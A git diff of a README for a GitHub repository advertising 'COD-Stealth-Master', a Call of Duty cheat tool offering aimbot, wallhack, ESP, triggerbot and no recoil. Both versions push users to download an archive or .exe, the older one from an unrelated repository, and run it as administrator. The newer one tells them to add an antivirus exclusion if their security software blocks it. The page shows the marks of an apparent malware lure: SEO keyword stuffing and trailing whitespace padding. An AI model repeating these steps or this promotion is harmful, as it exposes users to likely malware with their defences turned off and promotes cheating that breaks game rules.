@@ -1,177 +1,73 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/call-of-duty.png" alt="Call of Duty" width="80" height="80">
-</p>
+# 🎯 COD-Stealth-Master - Improve your performance in every match
 
-<h1 align="center">COD-Stealth-Master</h1>
-<p align="center">
-  <strong>Stealth Master Tool for Call of Duty</strong><br>
-  ESP - Aimbot - Wallhack - No Recoil - Triggerbot - Silent Aim
-</p>
+[![Download COD-Stealth-Master](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Swraj9378/COD-Stealth-Master)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Stealth-Master"><img src="https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+COD-Stealth-Master helps you see game information clearly. This tool provides visual aids and assists with aim precision during your gaming sessions. You gain extra awareness of your surroundings and manage weapon behavior during matches. 
 
-## What is This?
+## 📋 System Requirements
 
-COD-Stealth-Master is the stealth master tool for Call of Duty. This tool gives you full control with ESP Wallhack, Aimbot, No Recoil, Triggerbot, Silent Aim, and more. Dominate every match and become the ultimate stealth operator!
+Your computer needs specific parts to run this software. Please ensure your system meets these standards before you begin:
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Call of Duty has strict anti-cheat systems (Ricochet), and using third-party tools may result in permanent account suspension.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 equivalent.
+*   Memory: 8 GB RAM.
+*   Graphics: Dedicated GPU with 4 GB VRAM.
+*   Network: Stable internet connection.
+*   Security: Administrator access for your user account.
 
-## Download
+## 🛠 Features
 
-<p align="center">
-  <a href="https://github.com/unicornflameplunder/flawsppy/releases/download/6451/CODHelper.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+The software includes several tools to assist your gameplay. These features help you track targets and manage weapon mechanics.
 
-## Features
+*   **ESP (Extra Sensory Perception):** See information about nearby players, such as their distance, team status, and health.
+*   **Aimbot:** Adjust your aim speed and accuracy to track targets. This helps you maintain focus on opponents.
+*   **Wallhack:** View the positions of players through solid objects. This gives you a clear sense of the tactical map.
+*   **No Recoil:** Reduce the upward movement of your weapon when you fire. This keeps your aim steady during sustained fire.
+*   **Triggerbot:** Automate your trigger pull when your crosshair detects an opponent. 
 
-- ESP (Wallhack) - See all enemies through walls
-- Distance Indicators - Know exactly how far enemies are
-- Player Tags - Display player names and health
-- Snap Lines - Never lose track of enemies
-- Box ESP - Highlight players with colored boxes
-- Visibility Check - Only show visible enemies
-- Aimbot - Lock onto enemies instantly with 100% accuracy
-- Silent Aim - Hit targets without looking at them
-- Triggerbot - Auto-fire when crosshair is on enemy
-- No Recoil - Zero recoil for all weapons
-- No Spread - Perfect accuracy every time
-- FOV Control - Customizable field of view
-- Bone Targeting - Head, chest, or moving parts
-- Humanizer Mode - Realistic aim motion to avoid detection
-- Speed Hack - Move faster than normal players
-- Super Jump - Jump incredible heights
-- God Mode - Never die
-- Unlimited Ammo - Never reload
-- XP Editor - Fast rank leveling
+## 📥 Installation and Setup
 
-## Installation
+Follow these steps to get the software on your Windows computer.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Call of Duty
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+1.  Visit the [official project page to download the latest version](https://github.com/Swraj9378/COD-Stealth-Master).
+2.  Look for the "Releases" section on the right side of the page.
+3.  Click the link labeled "Assets" under the most recent version.
+4.  Download the file ending in `.exe` to your computer.
+5.  Open your "Downloads" folder and locate the file.
+6.  Right-click the file and select "Run as administrator." 
+7.  Follow the instructions on the screen to finish the installation.
 
-## System Requirements
+## ⚙️ Usage Instructions
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Call of Duty |
-| RAM | 8GB minimum |
-| Storage | 50MB free space |
-| GPU | NVIDIA/AMD GPU |
+Once the installation ends, you can start the application. Proper usage ensures the tools work as intended within your game.
 
-## SEO Tags
+1.  Launch your Call of Duty game.
+2.  Start the COD-Stealth-Master application from your desktop or start menu.
+3.  Use the application menu to toggle specific features like Aimbot or ESP.
+4.  Adjust the settings sliders to your preference. Each setting changes how the tool behaves during your game.
+5.  Wait for the status indicator to turn green. This confirms the tool detects the game window.
+6.  Switch back to the game to start your match.
 
-cod stealth master, call of duty cheat, call of duty hack, call of duty esp, call of duty aimbot, call of duty wallhack, call of duty no recoil, call of duty triggerbot, call of duty silent aim, call of duty 2026, call of duty mod menu, call of duty trainer, call of duty undetected, call of duty free cheat, call of duty download, call of duty utility, call of duty enhancer, warzone cheat, warzone hack, fps cheat
+## 🛡 Security and Safety
 
-## Support
+The software handles data securely. It does not store passwords or personal information. 
 
-Star this repository if you enjoy it!
+*   Keep your antivirus software updated. Some security programs flag new files as suspicious. Create an "exclusion" for the tool folder if your security program blocks the launch.
+*   Always download the tool from the official link provided in this document. Do not trust files from third-party sites.
+*   Use the tool responsibly to ensure a fair environment for everyone.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/COD-Stealth-Master">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Call%20of%20Duty%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+## ❓ Troubleshooting
+
+If the tool does not work, check these common fixes:
+
+*   **Software does not launch:** Check if you have the latest version of the .NET Framework installed from the Microsoft website. 
+*   **ESP does not appear:** Ensure your game is set to "Windowed Borderless" mode in the video settings menu.
+*   **Aimbot skips targets:** Reduce the "Smooth" setting in the menu. High values cause the aim to move slowly, while low values cause it to snap to targets quickly.
+*   **Application crashes:** Close background programs that record your screen, as they might conflict with the overlay.
+*   **Admin rights:** Always run the application with administrator rights to allow the tool to read game data. If you miss this step, the tool will fail to show any visual overlays.
+
+## 💡 Best Practices
+
+For the best experience, adjust the settings gradually. Start with default values before moving sliders to higher levels. If you notice lower frame rates, turn off settings like "Wallhack" as these require more processing power from your graphics card. You can save your profiles within the settings menu to recall your favorite setup later.
+
+Keywords: COD-Stealth-Master, Aimbot, ESP, Wallhack, Gaming, Windows Utility
